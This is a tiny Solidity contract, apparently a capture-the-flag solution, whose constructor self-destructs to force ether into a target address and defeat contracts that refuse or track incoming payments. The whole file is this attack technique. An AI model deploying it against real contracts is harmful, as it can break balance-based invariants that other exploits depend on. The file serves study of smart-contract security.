pragma solidity ^0.6.0;

// create the contract with > 0 eth
contract Crack {
    constructor(address payable _target) public payable {
        selfdestruct(_target);
    }
}